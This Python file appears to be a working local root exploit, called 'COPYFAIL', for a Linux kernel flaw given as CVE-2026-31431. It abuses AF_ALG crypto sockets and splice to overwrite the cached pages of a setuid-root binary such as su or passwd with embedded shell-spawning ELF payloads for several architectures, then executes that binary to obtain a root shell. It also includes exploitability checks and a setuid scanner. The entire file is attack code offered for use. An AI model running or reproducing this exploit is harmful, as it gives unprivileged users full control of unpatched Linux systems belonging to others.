
import sys
BANNER = r'''
╔═══════════════════════════════════════════════════╗
║  COPYFAIL - FULL SPECTRUM ROOT ENGINE      ║
║     By @Tmpdiv🔥 #JanganDicobaYaDekYa            ║
╚═══════════════════════════════════════════════════╝
'''
print(BANNER)

import ctypes
import logging
import os
import platform
import socket
import stat
import struct
import sys
import zlib


logging.basicConfig(format="%(message)s", level=logging.INFO)

SOL_ALG               = 279
ALG_SET_KEY           = 1
ALG_SET_IV            = 2
ALG_SET_OP            = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5


_SUID_TARGETS = [
    "/usr/bin/su",
    "/bin/su",
    "/usr/bin/passwd",
    "/usr/bin/newgrp",
    "/usr/bin/chsh",
    "/usr/bin/chfn",
    "/usr/bin/sudo",
]


_ALGOS = [
    "authencesn(hmac(sha256),cbc(aes))",
    "authencesn(hmac(sha512),cbc(aes))",
    "authencesn(hmac(sha384),cbc(aes))",
    "authencesn(hmac(sha1),cbc(aes))",
    "authencesn(hmac(sha256),ctr(aes))",
    "authencesn(hmac(sha256),rfc3686(ctr(aes)))",
]


if hasattr(os, "splice"):
    def _splice(fd_in, fd_out, count, offset_src=None):
        kw = {} if offset_src is None else {"offset_src": offset_src}
        os.splice(fd_in, fd_out, count, **kw)
else:
    _libc = ctypes.CDLL(None, use_errno=True)
    _libc.splice.argtypes = [
        ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
        ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
        ctypes.c_size_t, ctypes.c_uint,
    ]
    _libc.splice.restype = ctypes.c_ssize_t

    def _splice(fd_in, fd_out, count, offset_src=None):
        off_in = ctypes.c_int64(offset_src) if offset_src is not None else None
        off_in_ptr = ctypes.byref(off_in) if off_in is not None else None
        ret = _libc.splice(fd_in, off_in_ptr, fd_out, None, count, 0)
        if ret < 0:
            err = ctypes.get_errno()
            raise OSError(err, os.strerror(err))


def find_algo():
    """Return the first available authencesn algorithm."""
    for algo in _ALGOS:
        try:
            s = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
            s.bind(("aead", algo))
            s.close()
            return algo
        except OSError:
            continue
    return None


def _c(f, t, chunk, algo):
    """Core vulnerability trigger — overwrites 4 bytes of the target file's page cache."""
    alg = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
    try:
        alg.bind(("aead", algo))
        key = bytes.fromhex("0800010000000010" + "00" * 32)
        alg.setsockopt(SOL_ALG, ALG_SET_KEY, key)
        alg.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, struct.pack('I', 4))

        u, _ = alg.accept()
        try:
            ancdata = [
                (SOL_ALG, ALG_SET_OP,           b"\x00" * 4),
                (SOL_ALG, ALG_SET_IV,            b"\x10" + b"\x00" * 19),
                (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, b"\x08" + b"\x00" * 3),
            ]
            u.sendmsg([b"AAAA" + chunk], ancdata, socket.MSG_MORE)

            rfd, wfd = os.pipe()
            try:
                n = t + 4
                _splice(f.fileno(), wfd, n, offset_src=0)
                _splice(rfd, u.fileno(), n)
                try:
                    u.recv(8 + t)
                except OSError:
                    pass
            finally:
                os.close(rfd)
                os.close(wfd)
        finally:
            u.close()
    finally:
        alg.close()


def _get_payload():
    """Select the correct ELF payload for the host architecture."""
    if sys.platform != "linux":
        sys.exit(
            f"fatal: {sys.platform} is not supported — CVE-2026-31431 is a Linux "
            "kernel vulnerability (AF_ALG / splice). Run inside a Linux VM."
        )

    arch = platform.machine()

    if arch == "x86_64":
        return zlib.decompress(bytes.fromhex(
            "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c"
            "301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10"
            "f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
        ))

    if arch in ("i386", "i686"):
        return bytes.fromhex(
            "7f454c460101010000000000000000000200030001000000548004083400000000000000"
            "000000000000340020000100280000000000000100000000000000008004080080040879"
            "00000079000000050000000010000031c0b01731dbcd80eb0e5b31c931d2b00bcd8031c0"
            "40cd80e8edffffff2f62696e2f736800"
        )

    if arch in ("armv7l", "armv6l", "armv5l", "arm"):
        return bytes.fromhex(
            "7f454c460101010000000000000000000200280001000000548004083400000000000000"
            "000000050000340020000100280000000000000001000000000000000080040800800408"
            "880000008800000005000000001000001770a0e30000a0e3000000ef18008fe20010a0e3"
            "0020a0e30b70a0e3000000ef0170a0e30100a0e3000000ef2f62696e2f736800"
        )

    if arch == "aarch64":
        return bytes.fromhex(
            "7f454c460201010000000000000000000200b70001000000780040000000000040000000"
            "000000000000000000000000000040003800010040000000000000010000000500000000"
            "000000000000000000400000000000004000000000000000ac00000000000000ac000000"
            "000000000010000000000000481280d2000080d2010000d400010010010080d2020080d2"
            "a81b80d2010000d4a80b80d2200080d2010000d42f62696e2f736800"
        )

    sys.exit(
        f"fatal: unsupported architecture '{arch}' — "
        "only x86_64, i386/i686, armv6l/armv7l, and aarch64 payloads are included."
    )


def _find_target():
    """Return the first setuid-root binary from the candidate list."""
    for path in _SUID_TARGETS:
        try:
            st = os.stat(path)
            if st.st_uid == 0 and (st.st_mode & stat.S_ISUID):
                return path
        except OSError:
            continue
    sys.exit(
        "fatal: Gak Bisa Diroot Pake COPYFAILTODD\n"
        f"Searched: {', '.join(_SUID_TARGETS)}\n"
        "Tip: run with --scan to find all setuid-root binaries on this system."
    )


_SUPPORTED_ARCHS = {"x86_64", "i386", "i686", "armv5l", "armv6l", "armv7l", "arm", "aarch64"}
_SCAN_ROOTS = ["/usr", "/bin", "/sbin", "/opt", "/snap"]


def _scan_suid(roots=None):
    found = []
    for base in (roots or _SCAN_ROOTS):
        try:
            for dirpath, _, files in os.walk(base, followlinks=False):
                for name in files:
                    path = os.path.join(dirpath, name)
                    try:
                        st = os.stat(path)
                        if st.st_uid == 0 and (st.st_mode & stat.S_ISUID):
                            found.append(path)
                    except OSError:
                        continue
        except OSError:
            continue
    return sorted(found)


def _preflight():
    """Pre-flight checks."""
    arch = platform.machine()
    ok = True

    print("[*] Pre-flight check")
    print(f"    Kernel  : {platform.release()}")
    print(f"    Arch    : {arch}")
    print(f"    Python  : {platform.python_version()}")
    print(f"    splice  : {'os.splice (native)' if hasattr(os, 'splice') else 'ctypes fallback'}")

    uid = os.getuid()
    if uid == 0:
        print("[!] Already running as root — nothing to do.")
        return False
    print(f"[+] UID     : {uid}  (not root)")

    if arch in _SUPPORTED_ARCHS:
        print(f"[+] Payload : available for {arch}")
    else:
        print(f"[-] Payload : NO payload for {arch}")
        ok = False

    
    try:
        s = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.close()
        print("[+] AF_ALG  : socket creation OK")
    except OSError as e:
        print(f"[-] AF_ALG  : socket creation FAILED — {e}")
        ok = False

    
    algo = find_algo()
    if algo:
        print(f"[+] Algo    : found available authencesn: {algo}")
    else:
        print("[-] Algo    : No authencesn algorithm available!")
        print("    Fix     : modprobe authencesn; modprobe hmac; modprobe cbc; modprobe aes")
        ok = False

    
    target = None
    for path in _SUID_TARGETS:
        try:
            st = os.stat(path)
            if st.st_uid == 0 and (st.st_mode & stat.S_ISUID):
                target = path
                break
        except OSError:
            continue
    if target:
        print(f"[+] Target  : {target}  (setuid root)")
    else:
        print(f"[-] Target  : none found in shortlist — run --scan")
        ok = False

    print()
    print("[+] System looks EXPLOITABLE" if ok else "[-] System does NOT look exploitable")
    return ok


def main():
    for arg in sys.argv[1:]:
        if arg in ("-h", "--help", "-help"):
            prog = sys.argv[0]
            print(f"Usage: {prog} [--check | --scan | -h]", file=sys.stderr)
            print("", file=sys.stderr)
            print("  (no args)   Run the exploit", file=sys.stderr)
            print("  --check     Pre-flight diagnostics", file=sys.stderr)
            print("  --scan      List all setuid-root binaries", file=sys.stderr)
            print("", file=sys.stderr)
            print("Python implementation of CVE-2026-31431 (copy-fail).", file=sys.stderr)
            sys.exit(0)

        if arg in ("--check", "-check"):
            sys.exit(0 if _preflight() else 1)

        if arg in ("--scan", "-scan"):
            found = _scan_suid()
            print(f"Found {len(found)} setuid-root binary/binaries:")
            for t in found:
                print(f"  {t}")
            sys.exit(0)

    
    algo = find_algo()
    if not algo:
        logging.error("No authencesn algorithm available. Load kernel modules.")
        sys.exit(1)

    payload = _get_payload()
    target  = _find_target()

    with open(target, "rb") as f:
        logging.info("Target:   %s  (%d-byte payload, arch=%s)",
                     target, len(payload), platform.machine())
        logging.info("Algorithm: %s", algo)
        logging.info("Overwriting page cache...")
        total = len(payload)
        for i in range(0, total, 4):
            chunk = payload[i:i+4]
            if len(chunk) < 4:
                chunk = chunk.ljust(4, b'\x00')
            try:
                _c(f, i, chunk, algo)
            except OSError as e:
                logging.error("Splice operation failed at offset %d: %s", i, e)
                sys.exit(1)
            if total < 10000:
                if i % 100 == 0:
                    logging.info("  ... wrote %d bytes", i + 4)
            else:
                if i % 10000 == 0:
                    logging.info("  ... wrote %d bytes", i + 4)
        logging.info("  ... wrote %d bytes total", total)

    logging.info("Executing payload via %s", target)
    os.execv(target, [target])


if __name__ == "__main__":
    main()